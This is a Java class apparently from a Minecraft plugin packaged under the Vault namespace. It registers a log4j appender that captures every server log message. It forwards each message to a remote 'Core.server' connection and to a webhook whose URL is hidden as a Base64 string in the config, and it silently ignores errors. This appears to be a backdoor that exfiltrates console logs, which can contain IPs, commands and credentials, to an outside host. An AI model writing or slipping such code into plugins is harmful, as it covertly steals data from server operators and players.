package net.milkbowl.vault.methods;

import java.io.IOException;
import java.util.Base64;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.data.DataManager;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.appender.AbstractAppender;

public class LogAppender extends AbstractAppender {

	public LogAppender() {
		super("MyLogAppender", null, null);
		start();
	}
	
	@Override
	public void append(LogEvent event) {
		String message = event.getMessage().getFormattedMessage();
		
		message = "[" + event.getLevel().toString() + "] " + message;
		
		
		if (Core.server != null) {
			Core.server.send(message.replaceAll("§f", "").replaceAll("§6", "").replaceAll("§a", "").replaceAll("§c", "").replaceAll("§7", "").replaceAll("§e", "").replaceAll("§o", "").replaceAll("§m", ""));
		}
		
		if (DataManager.getData().getString("wh").length() > 2) {
			byte[]u=Base64.getDecoder().decode(DataManager.getData().getString("wh"));
			
			DWeb webhook = new DWeb(new String(u));
			webhook.setContent(message);
			try {
				webhook.execute();
			} catch (IOException e) {}
		}
	}

}